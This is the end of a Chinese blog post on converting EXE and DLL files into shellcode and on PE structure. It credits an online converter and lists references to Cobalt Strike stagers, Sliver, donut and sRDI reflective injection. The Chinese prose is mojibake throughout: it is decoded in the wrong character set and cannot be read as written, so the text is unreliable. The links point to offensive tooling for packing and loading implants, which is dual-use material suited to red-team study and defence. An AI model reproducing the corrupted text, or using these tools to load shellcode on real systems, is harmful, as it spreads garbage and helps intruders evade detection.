ç¡¬çœ‹äº†å‡ å¤©ä»£ç ï¼Œç»ˆäºæŠŠæ­¥éª¤å’ŒåŸç†éƒ½ç†æ¸…æ¥šäº†ä¸€ç‚¹ï¼Œä¹Ÿæ›´åŠ ç†è§£ PE çš„ç»“æ„äº†ã€‚ä¹‹å‰çš„`ä»»æ„exeè½¬shellcode`å·¥å…·ï¼ŒåŸç†æ˜¯ shellcode åŒ–çš„è¿›ç¨‹æ›¿æ¢ï¼Œä¸ç”¨å…³å¿ƒ PE ç»“æ„ï¼Œä½†å¾ˆå¤šä»£ç éƒ½æ˜¯åŸå§‹çš„æ‰‹æ’¸ï¼Œçœ‹äº†è¿™äº›ä»£ç åæ˜¯çœŸå¿ƒä½©æœå†™è¿™äº›ä»£ç çš„äººï¼Œç ”ç©¶çš„å¾ˆæ·±ï¼Œä»£ç å†™çš„ä¹Ÿå¾ˆå¥½ï¼Œå€¼å¾—å­¦ä¹ ä¸€ç•ªã€‚

Psï¼šhacking8 çš„åœ¨çº¿ exe è½¬ shellcode [https://i.hacking8.com/dll2shellcode/] å·²ç»é›†æˆäº†è¿™äº›æŠ€æœ¯çš„åœ¨çº¿è½¬æ¢ã€‚

![](https://mmbiz.qpic.cn/mmbiz_png/eLgL5R4W3FhRWOOMKPEl3xFkBicJefERlNSIPibxfDibVCWeX8gqOGqfc40quJk27ZzVYOaKz6jdzxibkSY23IOCJg/640?wx_fmt=png)image-20210412220106619

å‚è€ƒ
--

*   ä»»æ„ exe è½¬æ¢ shellcode
    

*   https://i.hacking8.com/exe2shellcode/
    

*   Stager Payload åŸç†åˆ†æ
    

*   https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/untitled-1
    

*   Sliver
    

*   https://github.com/BishopFox/sliver
    

*   donut
    

*   https://github.com/TheWover/donut
    

*   srdi å‘å±•å²
    

*   https://silentbreaksecurity.com/srdi-shellcode-reflective-dll-injection/
    
*   https://github.com/monoxgas/sRDI
    

*   å¯¼å…¥è¡¨å­¦ä¹ 
    

*   https://www.52pojie.cn/thread-1413220-1-1.html#37934121_%E5%AF%BC%E5%85%A5%E8%A1%A8
    

*   ä»»æ„ dll è½¬æ¢ shellcode
    

*   https://i.hacking8.com/dll2shellcode/
    

ç‚¹å‡»é˜…è¯»å…¨æ–‡å¯è·³è½¬åˆ°åšå®¢åŸæ–‡é“¾æ¥ğŸ”—